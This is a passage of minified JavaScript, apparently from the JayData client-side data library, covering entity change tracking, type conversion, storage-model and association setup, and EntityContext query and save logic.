this.propertyChanging.fire(eventData);}
if(memberDefinition.monitorChanges!=false&&(this._propertyValidationError||"instancePropertyValidationError"in this.constructor)){var errors=$data.Validation.Entity.ValidateEntityField(this,memberDefinition,value);if(errors.length>0){var origValue=this[memberDefinition.name];var errorEventData=new PropertyValidationEventData(memberDefinition.name,origValue,value,errors);if(this._propertyValidationError)
this.propertyValidationError.fire(errorEventData);if("instancePropertyValidationError"in this.constructor)
this.constructor["instancePropertyValidationError"].fire(errorEventData,this);if(errorEventData.cancel==true)
return;}}
if(memberDefinition.storeOnObject==true){var backingFieldName="_"+memberDefinition.name;this[backingFieldName]=value;}else{this.initData[memberDefinition.name]=value;}
this.isValidated=false;if(memberDefinition.monitorChanges!=false&&this.entityState==$data.EntityState.Unchanged)
this.entityState=$data.EntityState.Modified;if(memberDefinition.monitorChanges!=false){if(!this.changedProperties){this.changedProperties=[];}
if(!this.changedProperties.some(function(memDef){return memDef.name==memberDefinition.name}))
this.changedProperties.push(memberDefinition);if(this._propertyChanged)
this.propertyChanged.fire(eventData);if("instancePropertyChanged"in this.constructor){this.constructor["instancePropertyChanged"].fire(eventData,this);}}},typeConversion:function(memberDefinition,value){var convertedValue=value;if(typeof value==='string'&&!memberDefinition.concurrencyMode){switch(Container.resolveName(memberDefinition.type)){case'$data.Guid':if(value==='')return undefined;convertedValue=$data.parseGuid(value);break;case'$data.Integer':if(value==='')return undefined;convertedValue=parseInt(value);if(isNaN(convertedValue))
throw Guard.raise(new Exception('TypeError: ','value not convertable to $data.Integer',[memberDefinition,value]));break;case'$data.Number':if(value==='')return undefined;convertedValue=parseFloat(value);if(isNaN(convertedValue))
throw Guard.raise(new Exception('TypeError: ','value not convertable to $data.Number',[memberDefinition,value]));break;case'$data.Date':if(value==='')return undefined;convertedValue=new Date(value);if(isNaN(convertedValue.valueOf()))
throw Guard.raise(new Exception('TypeError: ','value not convertable to $data.Date',[memberDefinition,value]));break;case'$data.Boolean':if(value==='')return undefined;switch(value.toLowerCase()){case'true':convertedValue=true;break;case'false':convertedValue=false;break;default:throw Guard.raise(new Exception('TypeError: ','value not convertable to $data.Boolean',[memberDefinition,value]));}
break;case'$data.Object':if(value==='')return undefined;try{convertedValue=JSON.parse(value);}catch(e){throw Guard.raise(new Exception('TypeError: ',e.toString(),[memberDefinition,value]));}
break;default:break;}}
return convertedValue;},retrieveProperty:function(memberDefinition){if(memberDefinition.storeOnObject==true){var backingFieldName="_"+memberDefinition.name;return this[backingFieldName];}else{return this.initData[memberDefinition.name];}},getProperty:function(memberDefinition,callback,tran){callback=$data.typeSystem.createCallbackSetting(callback);if(this[memberDefinition.name]!=undefined){if(tran instanceof $data.Transaction)
callback.success(this[memberDefinition.name],tran);else
callback.success(this[memberDefinition.name]);return;}
if(!this.context)
Guard.raise(new Exception('Entity not in context','Invalid operation'));return this.context.loadItemProperty(this,memberDefinition,callback,tran);},setProperty:function(memberDefinition,value,callback,tran){this[memberDefinition.name]=value;var pHandler=new $data.PromiseHandler();callback=pHandler.createCallback(callback);callback.success(this[memberDefinition.name]);return pHandler.getPromise();},isValid:function(){if(!this.isValidated){this.ValidationErrors=$data.Validation.Entity.ValidateEntity(this);this.isValidated=true;}
return this.ValidationErrors.length==0;},isValidated:{dataType:"bool",storeOnObject:true,monitorChanges:false,notMapped:true,enumerable:false,value:false},ValidationErrors:{dataType:Array,elementType:$data.Validation.ValidationError,storeOnObject:true,monitorChanges:true,notMapped:true,enumerable:false},resetChanges:function(){delete this._changedProperties;},changedProperties:{dataType:Array,elementType:window["MemberDefinition"],storeOnObject:true,monitorChanges:false,notMapped:true,enumerable:false},entityState:{dataType:"integer",storeOnObject:true,monitorChanges:false,notMapped:true,enumerable:false},remove:function(){if($data.ItemStore&&'EntityInstanceRemove'in $data.ItemStore)
return $data.ItemStore.EntityInstanceRemove.apply(this,arguments);else
throw'not implemented';},save:function(){if($data.ItemStore&&'EntityInstanceSave'in $data.ItemStore)
return $data.ItemStore.EntityInstanceSave.apply(this,arguments);else
throw'not implemented';},refresh:function(){if($data.ItemStore&&'EntityInstanceSave'in $data.ItemStore)
return $data.ItemStore.EntityInstanceRefresh.apply(this,arguments);else
throw'not implemented';},storeToken:{type:Object,monitorChanges:false,notMapped:true,storeOnObject:true}},{__setPropertyfunctions:{value:true,notMapped:true,enumerable:false,storeOnObject:true},__copyPropertiesToInstance:{value:false,notMapped:true,enumerable:false,storeOnObject:true},inheritedTypeProcessor:function(type){if($data.ItemStore&&'EntityInheritedTypeProcessor'in $data.ItemStore)
$data.ItemStore.EntityInheritedTypeProcessor.apply(this,arguments);type.defaultValues={};type.memberDefinitions.asArray().forEach(function(pd){if(pd.hasOwnProperty("defaultValue")){type.defaultValues[pd.name]=pd.defaultValue;}});if(Object.keys(type.defaultValues).length>0){type.setDefaultValues=function(initData,instance){initData=initData||{};var dv=type.defaultValues;for(var n in dv){if(!(n in initData)){var value=dv[n];if("function"===typeof value){initData[n]=dv[n](n,instance);}else{initData[n]=dv[n];}}}
console.log("ret init:",initData);return initData;}}},addEventListener:function(eventName,fn){var delegateName="on"+eventName;if(!(delegateName in this)){this[delegateName]=new $data.Event(eventName,this);}
this[delegateName].attach(fn);},removeEventListener:function(eventName,fn){var delegateName="on"+eventName;if(!(delegateName in this)){return;}
this[delegateName].detach(fn);},raiseEvent:function(eventName,data){var delegateName="on"+eventName;if(!(delegateName in this)){return;}
this[delegateName].fire(data);},getFieldNames:function(){return this.memberDefinitions.getPublicMappedPropertyNames();}});$data.define=function(name,definition){if(!definition){throw new Error("json object type is not supported yet");}
var _def={};var hasKey=false;var keyFields=[];Object.keys(definition).forEach(function(fieldName){var propDef=definition[fieldName];if(typeof propDef==='object'&&("type"in propDef||"get"in propDef||"set"in propDef)){_def[fieldName]=propDef;if(propDef.key){keyFields.push(propDef);}
if(("get"in propDef||"set"in propDef)&&(!('notMapped'in propDef)||propDef.notMapped===true)){propDef.notMapped=true;propDef.storeOnObject=true;}
if("get"in propDef&&!("set"in propDef)){propDef.set=function(){};}else if("set"in propDef&&!("get"in propDef)){propDef.get=function(){};}}else{_def[fieldName]={type:propDef};}});if(keyFields.length<1){var keyProp;switch(true){case"id"in _def:keyProp="id";break;case"Id"in _def:keyProp="Id"
break;case"ID"in _def:keyProp="ID"
break;}
if(keyProp){_def[keyProp].key=true;var propTypeName=$data.Container.resolveName(_def[keyProp].type);_def[keyProp].computed=true;}else{_def.Id={type:"int",key:true,computed:true}}}
var entityType=$data.Entity.extend(name,_def);return entityType;}
$data.implementation=function(name){return Container.resolveType(name);};$data.Class.define('$data.StorageModel',null,null,{constructor:function(){this.ComplexTypes=[];this.Associations=[];},LogicalType:{},LogicalTypeName:{},PhysicalType:{},PhysicalTypeName:{},EventHandlers:{},TableName:{},TableOptions:{value:undefined},ComplexTypes:{},Associations:{},ContextType:{}},null);$data.Class.define('$data.Association',null,null,{constructor:function(initParam){if(initParam){this.From=initParam.From;this.FromType=initParam.FromType;this.FromMultiplicity=initParam.FromMultiplicity;this.FromPropertyName=initParam.FromPropertyName;this.To=initParam.To;this.ToType=initParam.ToType;this.ToMultiplicity=initParam.ToMultiplicity;this.ToPropertyName=initParam.ToPropertyName;}},From:{},FromType:{},FromMultiplicity:{},FromPropertyName:{},To:{},ToType:{},ToMultiplicity:{},ToPropertyName:{},ReferentialConstraint:{}},null);$data.Class.define('$data.ComplexType',$data.Association,null,{},null);$data.Class.define('$data.EntityContext',null,null,{constructor:function(storageProviderCfg){if($data.ItemStore&&'ContextRegister'in $data.ItemStore)
$data.ItemStore.ContextRegister.apply(this,arguments);if("string"===typeof storageProviderCfg){if(0===storageProviderCfg.indexOf("http")){storageProviderCfg={name:"oData",oDataServiceHost:storageProviderCfg}}else{storageProviderCfg={name:"local",databaseName:storageProviderCfg}}}
if("provider"in storageProviderCfg){storageProviderCfg.name=storageProviderCfg.provider;}
this.lazyLoad=false;this.trackChanges=false;this._entitySetReferences={};this._storageModel=[];var ctx=this;ctx._isOK=false;var origSuccessInitProvider=this._successInitProvider;this._successInitProvider=function(errorOrContext){if(errorOrContext instanceof $data.EntityContext){origSuccessInitProvider(ctx);}else{origSuccessInitProvider(ctx,errorOrContext);}}
this._storageModel.getStorageModel=function(typeName){var resolvedType=Container.resolveType(typeName);for(var i=0;i<ctx._storageModel.length;i++){var s=ctx._storageModel[i];if(s.LogicalType===resolvedType)
return s;}};if(typeof storageProviderCfg.name==='string'){var tmp=storageProviderCfg.name;storageProviderCfg.name=[tmp];}
var i=0,providerType;var providerList=[].concat(storageProviderCfg.name);var callBack=$data.typeSystem.createCallbackSetting({success:this._successInitProvider,error:this._successInitProvider});this._initStorageModelSync();ctx._initializeEntitySets(ctx.getType());$data.StorageProviderLoader.load(providerList,{success:function(providerType){ctx.storageProvider=new providerType(storageProviderCfg,ctx);ctx.storageProvider.setContext(ctx);ctx.stateManager=new $data.EntityStateManager(ctx);var contextType=ctx.getType();if(providerType.name in contextType._storageModelCache){ctx._storageModel=contextType._storageModelCache[providerType.name];}else{ctx._initializeStorageModel();contextType._storageModelCache[providerType.name]=ctx._storageModel;}
if(storageProviderCfg&&storageProviderCfg.user)Object.defineProperty(ctx,'user',{value:storageProviderCfg.user,enumerable:true});if(storageProviderCfg&&storageProviderCfg.checkPermission)Object.defineProperty(ctx,'checkPermission',{value:storageProviderCfg.checkPermission,enumerable:true});if(ctx.storageProvider){ctx.storageProvider.initializeStore(callBack);}},error:function(){callBack.error('Provider fallback failed!');}});this.addEventListener=function(eventName,fn){var delegateName="on"+eventName;if(!(delegateName in this)){this[delegateName]=new $data.Event(eventName,this);}
this[delegateName].attach(fn);};this.removeEventListener=function(eventName,fn){var delegateName="on"+eventName;if(!(delegateName in this)){return;}
this[delegateName].detach(fn);};this.raiseEvent=function(eventName,data){var delegateName="on"+eventName;if(!(delegateName in this)){return;}
this[delegateName].fire(data);};},beginTransaction:function(){var tables=null;var callBack=null;var isWrite=false;switch(arguments.length){case 3:tables=arguments[0];isWrite=arguments[1];callBack=arguments[2];break;case 2:if(arguments[0]instanceof $data.Array){tables=arguments[0];}else{isWrite=arguments[0];}
callBack=arguments[1];break;case 1:callBack=arguments[0];break;case 0:break;default:throw new Exception("Begin tran is async function!");break;}
var pHandler=new $data.PromiseHandler();callBack=pHandler.createCallback(callBack);this.storageProvider._beginTran(tables,isWrite,callBack);return pHandler.getPromise();},_isReturnTransaction:function(transaction){return transaction instanceof $data.Base||transaction==='returnTransaction';},_applyTransaction:function(scope,cb,args,transaction,isReturnTransaction){if(isReturnTransaction===true){if(transaction instanceof $data.Transaction){Array.prototype.push.call(args,transaction);cb.apply(scope,args);}else{this.beginTransaction(function(tran){Array.prototype.push.call(args,tran);cb.apply(scope,args);});}}
else{cb.apply(scope,args);}},getDataType:function(dataType){if(typeof dataType=="string"){var memDef_dataType=this[dataType];if(memDef_dataType===undefined||memDef_dataType===null){memDef_dataType=eval(dataType);}
return memDef_dataType;}
return dataType;},_initializeEntitySets:function(ctor){for(var i=0,l=this._storageModel.length;i<l;i++){var storageModel=this._storageModel[i];this[storageModel.ItemName]=new $data.EntitySet(storageModel.LogicalType,this,storageModel.ItemName,storageModel.EventHandlers);var sm=this[storageModel.ItemName];sm.name=storageModel.ItemName;sm.tableName=storageModel.TableName;sm.tableOptions=storageModel.TableOptions;sm.eventHandlers=storageModel.EventHandlers;this._entitySetReferences[storageModel.LogicalType.name]=sm;this._initializeActions(sm,ctor,ctor.getMemberDefinition(storageModel.ItemName));}},_initStorageModelSync:function(){var _memDefArray=this.getType().memberDefinitions.asArray();for(var i=0;i<_memDefArray.length;i++){var item=_memDefArray[i];if('dataType'in item){var itemResolvedDataType=Container.resolveType(item.dataType);if(itemResolvedDataType&&itemResolvedDataType.isAssignableTo&&itemResolvedDataType.isAssignableTo($data.EntitySet)){var storageModel=new $data.StorageModel();storageModel.TableName=item.tableName||item.name;storageModel.TableOptions=item.tableOptions;storageModel.ItemName=item.name;storageModel.LogicalType=Container.resolveType(item.elementType);storageModel.LogicalTypeName=storageModel.LogicalType.name;storageModel.PhysicalTypeName=$data.EntityContext._convertLogicalTypeNameToPhysical(storageModel.LogicalTypeName);storageModel.ContextType=this.getType();if(item.indices){storageModel.indices=item.indices;}
if(item.beforeCreate){if(!storageModel.EventHandlers)storageModel.EventHandlers={};storageModel.EventHandlers.beforeCreate=item.beforeCreate;}
if(item.beforeRead){if(!storageModel.EventHandlers)storageModel.EventHandlers={};storageModel.EventHandlers.beforeRead=item.beforeRead;}
if(item.beforeUpdate){if(!storageModel.EventHandlers)storageModel.EventHandlers={};storageModel.EventHandlers.beforeUpdate=item.beforeUpdate;}
if(item.beforeDelete){if(!storageModel.EventHandlers)storageModel.EventHandlers={};storageModel.EventHandlers.beforeDelete=item.beforeDelete;}
if(item.afterCreate){if(!storageModel.EventHandlers)storageModel.EventHandlers={};storageModel.EventHandlers.afterCreate=item.afterCreate;}
if(item.afterRead){if(!storageModel.EventHandlers)storageModel.EventHandlers={};storageModel.EventHandlers.afterRead=item.afterRead;}
if(item.afterUpdate){if(!storageModel.EventHandlers)storageModel.EventHandlers={};storageModel.EventHandlers.afterUpdate=item.afterUpdate;}
if(item.afterDelete){if(!storageModel.EventHandlers)storageModel.EventHandlers={};storageModel.EventHandlers.afterDelete=item.afterDelete;}
this._storageModel.push(storageModel);}}}},_initializeStorageModel:function(){var _memDefArray=this.getType().memberDefinitions.asArray();if(typeof intellisense!=='undefined')
return;for(var i=0;i<this._storageModel.length;i++){var storageModel=this._storageModel[i];var dbEntityInstanceDefinition={};storageModel.Associations=storageModel.Associations||[];storageModel.ComplexTypes=storageModel.ComplexTypes||[];for(var j=0;j<storageModel.LogicalType.memberDefinitions.getPublicMappedProperties().length;j++){var memDef=storageModel.LogicalType.memberDefinitions.getPublicMappedProperties()[j];var memDefResolvedDataType=Container.resolveType(memDef.dataType);if((this.storageProvider.supportedDataTypes.indexOf(memDefResolvedDataType)>-1)&&Object.isNullOrUndefined(memDef.inverseProperty)){var t=JSON.parse(JSON.stringify(memDef));t.dataType=memDefResolvedDataType;dbEntityInstanceDefinition[memDef.name]=t;continue;}
this._buildDbType_navigationPropertyComplite(memDef,memDefResolvedDataType,storageModel);if((memDefResolvedDataType===$data.Array||(memDefResolvedDataType.isAssignableTo&&memDefResolvedDataType.isAssignableTo($data.EntitySet)))&&(memDef.inverseProperty&&memDef.inverseProperty!=='$$unbound')){this._buildDbType_Collection_OneManyDefinition(dbEntityInstanceDefinition,storageModel,memDefResolvedDataType,memDef);}else{if(memDef.inverseProperty){if(memDef.inverseProperty==='$$unbound'){if(memDefResolvedDataType===$data.Array){this._buildDbType_Collection_OneManyDefinition(dbEntityInstanceDefinition,storageModel,memDefResolvedDataType,memDef);}else{this._buildDbType_ElementType_OneManyDefinition(dbEntityInstanceDefinition,storageModel,memDefResolvedDataType,memDef);}}else{var fields=memDefResolvedDataType.memberDefinitions.getMember(memDef.inverseProperty);if(fields){if(fields.elementType){var referealResolvedType=Container.resolveType(fields.elementType);if(referealResolvedType===storageModel.LogicalType){this._buildDbType_ElementType_OneManyDefinition(dbEntityInstanceDefinition,storageModel,memDefResolvedDataType,memDef);}else{if(typeof intellisense==='undefined'){Guard.raise(new Exception('Inverse property not valid, refereed item element type not match: '+storageModel.LogicalTypeName,', property: '+memDef.name));}}}else{this._buildDbType_ElementType_OneOneDefinition(dbEntityInstanceDefinition,storageModel,memDefResolvedDataType,memDef);}}else{if(typeof intellisense==='undefined'){Guard.raise(new Exception('Inverse property not valid'));}}}}else{this._buildDbType_addComplexTypePropertyDefinition(dbEntityInstanceDefinition,storageModel,memDefResolvedDataType,memDef);}}}
this._buildDbType_modifyInstanceDefinition(dbEntityInstanceDefinition,storageModel,this);var dbEntityClassDefinition={};dbEntityClassDefinition.convertTo=this._buildDbType_generateConvertToFunction(storageModel,this);this._buildDbType_modifyClassDefinition(dbEntityClassDefinition,storageModel,this);storageModel.PhysicalType=$data.Class.define(storageModel.PhysicalTypeName,$data.Entity,null,dbEntityInstanceDefinition,dbEntityClassDefinition);}},_initializeActions:function(es,ctor,esDef){if(esDef&&esDef.actions){var actionKeys=Object.keys(esDef.actions);for(var i=0;i<actionKeys.length;i++){var actionName=actionKeys[i];var action=esDef.actions[actionName];if(typeof action==='function'){es[actionName]=action;}else{var actionDef=$data.MemberDefinition.translateDefinition(action,actionName,ctor);if(actionDef instanceof $data.MemberDefinition&&actionDef.kind===$data.MemberTypes.method){es[actionName]=actionDef.method;}}}}},_buildDbType_navigationPropertyComplite:function(memDef,memDefResolvedDataType,storageModel){if(!memDef.inverseProperty){var refMemDefs=null;if(memDefResolvedDataType===$data.Array||(memDefResolvedDataType.isAssignableTo&&memDefResolvedDataType.isAssignableTo($data.EntitySet))){var refStorageModel=this._storageModel.getStorageModel(Container.resolveType(memDef.elementType));if(refStorageModel){refMemDefs=[];var pubDefs=refStorageModel.LogicalType.memberDefinitions.getPublicMappedProperties();for(var i=0;i<pubDefs.length;i++){var m=pubDefs[i];if((m.inverseProperty==memDef.name)&&(Container.resolveType(m.dataType)===Container.resolveType(storageModel.LogicalType)))
refMemDefs.push(m);}}}else{var refStorageModel=this._storageModel.getStorageModel(memDefResolvedDataType);if(refStorageModel){refMemDefs=[];var pubDefs=refStorageModel.LogicalType.memberDefinitions.getPublicMappedProperties();for(var i=0;i<pubDefs.length;i++){var m=pubDefs[i];if(m.elementType&&((m.inverseProperty==memDef.name)&&(Container.resolveType(m.elementType)===storageModel.LogicalType)))
refMemDefs.push(m);else if((m.inverseProperty==memDef.name)&&(Container.resolveType(m.dataType)===storageModel.LogicalType))
refMemDefs.push(m);}}}
if(refMemDefs){if(refMemDefs.length>1){if(typeof intellisense!=='undefined'){Guard.raise(new Exception('More than one inverse property refer to this member definition: '+memDef.name+', type: '+Container.resolveName(storageModel.LogicalType)));}}
var refMemDef=refMemDefs.pop();if(refMemDef){memDef.inverseProperty=refMemDef.name;}}}else{var refStorageModel=null;if(memDefResolvedDataType===$data.Array||(memDefResolvedDataType.isAssignableTo&&memDefResolvedDataType.isAssignableTo($data.EntitySet))){refStorageModel=this._storageModel.getStorageModel(Container.resolveType(memDef.elementType));}else{refStorageModel=this._storageModel.getStorageModel(memDefResolvedDataType);}
var p=refStorageModel.LogicalType.memberDefinitions.getMember(memDef.inverseProperty);if(p){if(p.inverseProperty){if(p.inverseProperty!=memDef.name){if(typeof intellisense==='undefined'){Guard.raise(new Exception('Inverse property mismatch'));}}}else{p.inverseProperty=memDef.name;}}}},_buildDbType_generateConvertToFunction:function(storageModel){return function(instance){return instance;};},_buildDbType_modifyInstanceDefinition:function(instanceDefinition,storageModel){return;},_buildDbType_modifyClassDefinition:function(classDefinition,storageModel){return;},_buildDbType_addComplexTypePropertyDefinition:function(dbEntityInstanceDefinition,storageModel,memDef_dataType,memDef){this._addNavigationPropertyDefinition(dbEntityInstanceDefinition,memDef,memDef.name,$data.MemberTypes.complexProperty);var complexType=this._createComplexElement(storageModel.LogicalType,"",memDef.name,memDef_dataType,"","");storageModel.ComplexTypes[memDef.name]=complexType;storageModel.ComplexTypes.push(complexType);},_buildDbType_Collection_OneManyDefinition:function(dbEntityInstanceDefinition,storageModel,memDef_dataType,memDef){var refereedType=Container.resolveType(memDef.elementType);if(refereedType===undefined||refereedType===null){if(typeof intellisense==='undefined'){Guard.raise(new Exception("Element type definition error","Field definition",memDef));}}
var refereedStorageModel;for(var i=0;i<this._storageModel.length;i++){var s=this._storageModel[i];if(s.LogicalType===refereedType){refereedStorageModel=s;break;}}
if(!refereedStorageModel){if(typeof intellisense==='undefined'){Guard.raise(new Exception("No EntitySet definition for the following element type","Field definition",memDef));}}
this._addNavigationPropertyDefinition(dbEntityInstanceDefinition,memDef,memDef.name);var associationType=memDef.inverseProperty==='$$unbound'?'$$unbound':'0..1';var association=this._addAssociationElement(storageModel.LogicalType,associationType,memDef.name,refereedStorageModel.LogicalType,"*",memDef.inverseProperty);storageModel.Associations[memDef.name]=association;storageModel.Associations.push(association);},_buildDbType_ElementType_OneManyDefinition:function(dbEntityInstanceDefinition,storageModel,memDef_dataType,memDef){var refereedType=Container.resolveType(memDef.dataType);if(refereedType===undefined||refereedType===null){if(typeof intellisense==='undefined'){Guard.raise(new Exception("Element type definition error","Field definition",memDef));}}
var refereedStorageModel;for(var i=0;i<this._storageModel.length;i++){var s=this._storageModel[i];if(s.LogicalType===refereedType){refereedStorageModel=s;break;}}
if(!refereedStorageModel){if(typeof intellisense==='undefined'){Guard.raise(new Exception("No EntitySet definition for the following element type","Field definition",memDef));}}
this._addNavigationPropertyDefinition(dbEntityInstanceDefinition,memDef,memDef.name);var associationType=memDef.inverseProperty==='$$unbound'?'$$unbound':'*';var association=this._addAssociationElement(storageModel.LogicalType,associationType,memDef.name,refereedStorageModel.LogicalType,"0..1",memDef.inverseProperty);storageModel.Associations[memDef.name]=association;storageModel.Associations.push(association);},_buildDbType_ElementType_OneOneDefinition:function(dbEntityInstanceDefinition,storageModel,memDef_dataType,memDef){var refereedType=Container.resolveType(memDef.dataType);if(refereedType===undefined||refereedType===null){if(typeof intellisense==='undefined'){Guard.raise(new Exception("Element type definition error","Field definition",memDef));}}
var refereedStorageModel;for(var i=0;i<this._storageModel.length;i++){var s=this._storageModel[i];if(s.LogicalType===refereedType){refereedStorageModel=s;break;}}
if(!refereedStorageModel){if(typeof intellisense==='undefined'){Guard.raise(new Exception("No EntitySet definition following element type","Field definition",memDef));}}
var refereedMemberDefinition=refereedStorageModel.LogicalType.memberDefinitions.getMember(memDef.inverseProperty);if(!refereedMemberDefinition.required&&!memDef.required){if(typeof intellisense==='undefined'){if(typeof intellisense==='undefined'){Guard.raise(new Exception('In one to one connection, one side must required!','One to One connection',memDef));}}}
this._addNavigationPropertyDefinition(dbEntityInstanceDefinition,memDef,memDef.name);var association=this._addAssociationElement(storageModel.LogicalType,memDef.required?"0..1":"1",memDef.name,refereedStorageModel.LogicalType,memDef.required?"1":"0..1",memDef.inverseProperty);storageModel.Associations[memDef.name]=association;storageModel.Associations.push(association);},_addNavigationPropertyDefinition:function(definition,member,associationName,kind){var t=JSON.parse(JSON.stringify(member));t.dataType=$data.EntitySet;t.notMapped=true;t.kind=kind?kind:$data.MemberTypes.navProperty;t.association=associationName;definition[member.name]=t;},_addAssociationElement:function(fromType,fromMultiplicity,fromPropName,toType,toMultiplicity,toPropName){return new $data.Association({From:fromType.name,FromType:fromType,FromMultiplicity:fromMultiplicity,FromPropertyName:fromPropName,To:toType.name,ToType:toType,ToMultiplicity:toMultiplicity,ReferentialConstraint:[],ToPropertyName:toPropName});},_createComplexElement:function(fromType,fromMultiplicity,fromPropName,toType,toMultiplicity,toPropName){return new $data.ComplexType({From:fromType.name,FromType:fromType,FromMultiplicity:fromMultiplicity,FromPropertyName:fromPropName,To:toType.name,ToType:toType,ToMultiplicity:toMultiplicity,ReferentialConstraint:[],ToPropertyName:toPropName});},_successInitProvider:function(context,error){if(context instanceof $data.EntityContext&&context._isOK!==undefined){if(!error){context._isOK=true;if(context.onReadyFunction){for(var i=0;i<context.onReadyFunction.length;i++){context.onReadyFunction[i].success(context);}
context.onReadyFunction=undefined;}}else{context._isOK=error;if(context.onReadyFunction){for(var i=0;i<context.onReadyFunction.length;i++){context.onReadyFunction[i].error(error);}
context.onReadyFunction=undefined;}}}},onReady:function(fn){var pHandler=new $data.PromiseHandler();var callBack=pHandler.createCallback(fn);if(this._isOK===true){callBack.success(this);}else if(this._isOK!==false){callBack.error(this._isOK);}else{this.onReadyFunction=this.onReadyFunction||[];this.onReadyFunction.push(callBack);}
return pHandler.getPromise();},getEntitySetFromElementType:function(elementType){var result=this._entitySetReferences[elementType];if(!result){try{result=this._entitySetReferences[eval(elementType).name];}catch(ex){}}
return result;},executeQuery:function(queryable,callBack,transaction){var query=new $data.Query(queryable.expression,queryable.defaultType,this);query.transaction=transaction instanceof $data.Transaction?transaction:undefined;var returnTransaction=this._isReturnTransaction(transaction);callBack=$data.typeSystem.createCallbackSetting(callBack);var that=this;var clbWrapper={};clbWrapper.success=function(query){query.buildResultSet(that);if($data.ItemStore&&'QueryResultModifier'in $data.ItemStore)
$data.ItemStore.QueryResultModifier.call(that,query);var successResult;if(query.expression.nodeType===$data.Expressions.ExpressionType.Single||query.expression.nodeType===$data.Expressions.ExpressionType.Count||query.expression.nodeType===$data.Expressions.ExpressionType.BatchDelete||query.expression.nodeType===$data.Expressions.ExpressionType.Some||query.expression.nodeType===$data.Expressions.ExpressionType.Every){if(query.result.length!==1){callBack.error(new Exception('result count failed'));return;}
successResult=query.result[0];}else if(query.expression.nodeType===$data.Expressions.ExpressionType.First){if(query.result.length===0){callBack.error(new Exception('result count failed'));return;}
successResult=query.result[0];}else{if(typeof query.__count==='number'&&query.result)
query.result.totalCount=query.__count;that.storageProvider._buildContinuationFunction(that,query);successResult=query.result;}
var readyFn=function(){that._applyTransaction(callBack,callBack.success,[successResult],query.transaction,returnTransaction);};var i=0;var sets=query.getEntitySets();var callbackFn=function(){var es=sets[i];if(es.afterRead){i++;var r=es.afterRead.call(this,successResult,sets,query);if(typeof r==='function'){r.call(this,i<sets.length?callbackFn:readyFn,successResult,sets,query);}else{if(i<sets.length){callbackFn();}else readyFn();}}else readyFn();}
if(sets.length)callbackFn();else readyFn();};clbWrapper.error=function(){if(returnTransaction)
callBack.error.apply(this,arguments);else
callBack.error.apply(this,Array.prototype.filter.call(arguments,function(p){return!(p instanceof $data.Transaction);}));};var sets=query.getEntitySets();var authorizedFn=function(){var ex=true;var wait=false;var ctx=that;var readyFn=function(cancel){if(cancel===false)ex=false;if(ex){if(query.transaction){ctx.storageProvider.executeQuery(query,clbWrapper);}else{ctx.beginTransaction(function(tran){query.transaction=tran;ctx.storageProvider.executeQuery(query,clbWrapper);});}}else{query.rawDataList=[];query.result=[];clbWrapper.success(query);}};var i=0;var callbackFn=function(cancel){if(cancel===false)ex=false;var es=sets[i];if(es.beforeRead){i++;var r=es.beforeRead.call(this,sets,query);if(typeof r==='function'){r.call(this,(i<sets.length&&ex)?callbackFn:readyFn,sets,query);}else{if(r===false)ex=false;if(i<sets.length&&ex){callbackFn();}else readyFn();}}else readyFn();};if(sets.length)callbackFn();else readyFn();};if(this.user&&this.checkPermission){this.checkPermission(query.expression.nodeType===$data.Expressions.ExpressionType.BatchDelete?$data.Access.DeleteBatch:$data.Access.Read,this.user,sets,{success:authorizedFn,error:clbWrapper.error});}else authorizedFn();},saveChanges:function(callback,transaction){var changedEntities=[];var trackedEntities=this.stateManager.trackedEntities;var pHandler=new $data.PromiseHandler();var clbWrapper=pHandler.createCallback(callback);var pHandlerResult=pHandler.getPromise();var returnTransaction=this._isReturnTransaction(transaction);var skipItems=[];while(trackedEntities.length>0){var additionalEntities=[];for(var i=0;i<trackedEntities.length;i++){var entityCachedItem=trackedEntities[i];var sModel=this._storageModel.getStorageModel(entityCachedItem.data.getType());if(entityCachedItem.data.entityState==$data.EntityState.Unchanged){entityCachedItem.skipSave=true;skipItems.push(entityCachedItem.data);}else{if(entityCachedItem.data.entityState==$data.EntityState.Modified){if(entityCachedItem.data.changedProperties){var changeStoredProperty=entityCachedItem.data.changedProperties.some(function(p){var pMemDef=sModel.PhysicalType.memberDefinitions.getMember(p.name);if(pMemDef.kind==$data.MemberTypes.navProperty){var a=sModel.Associations[pMemDef.association];var multiplicity=a.FromMultiplicity+a.ToMultiplicity;return((multiplicity=='*0..1')||(multiplicity=='0..11'))}
return true;});if(!changeStoredProperty){entityCachedItem.skipSave=true;skipItems.push(entityCachedItem.data);}}}}
this.processEntityTypeBeforeEventHandler(skipItems,entityCachedItem);var navigationProperties=[];var smPhyMemDefs=sModel.PhysicalType.memberDefinitions.asArray();for(var ism=0;ism<smPhyMemDefs.length;ism++){var p=smPhyMemDefs[ism];if(p.kind==$data.MemberTypes.navProperty)
navigationProperties.push(p);}
for(var j=0;j<navigationProperties.length;j++){var navProp=navigationProperties[j];var association=sModel.Associations[navProp.name];var name=navProp.name;var navPropertyName=association.ToPropertyName;var connectedDataList=[].concat(entityCachedItem.data[name]);for(var k=0;k<connectedDataList.length;k++){var data=connectedDataList[k];if(data){var value=data[navPropertyName];var associationType=association.FromMultiplicity+association.ToMultiplicity;if(association.FromMultiplicity==='$$unbound'){if(data instanceof $data.Array){entityCachedItem.dependentOn=entityCachedItem.dependentOn||[];for(var l=0;l<data.length;l++){var dataItem=data[l];if((entityCachedItem.dependentOn.indexOf(data)<0)&&(data.skipSave!==true)){entityCachedItem.dependentOn.push(data);}}}else{entityCachedItem.dependentOn=entityCachedItem.dependentOn||[];if((entityCachedItem.dependentOn.indexOf(data)<0)&&(data.skipSave!==true)){entityCachedItem.dependentOn.push(data);}}}else{switch(associationType){case"*0..1":if(value){if(value instanceof Array){if(value.indexOf(entityCachedItem.data)==-1){value.push(entityCachedItem.data);data[navPropertyName]=value;}}else{if(typeof intellisense==='undefined'){Guard.raise("Item must be array or subtype of array");}}}else{data[navPropertyName]=[entityCachedItem.data];}
break;default:if(value){if(value!==entityCachedItem.data){if(typeof intellisense==='undefined'){Guard.raise("Integrity check error! Item assigned to another entity!");}}}else{data[navPropertyName]=entityCachedItem.data;}
break;}
switch(associationType){case"*0..1":case"0..11":entityCachedItem.dependentOn=entityCachedItem.dependentOn||[];if((entityCachedItem.dependentOn.indexOf(data)<0)&&(data.skipSave!==true)){entityCachedItem.dependentOn.push(data);}
break;}}
if(!data.entityState){data.entityState=$data.EntityState.Added;}
if(additionalEntities.indexOf(data)==-1){additionalEntities.push(data);}}}}}
for(var i=0;i<trackedEntities.length;i++){var entity=trackedEntities[i];if(entity.skipSave!==true){changedEntities.push(entity);}}
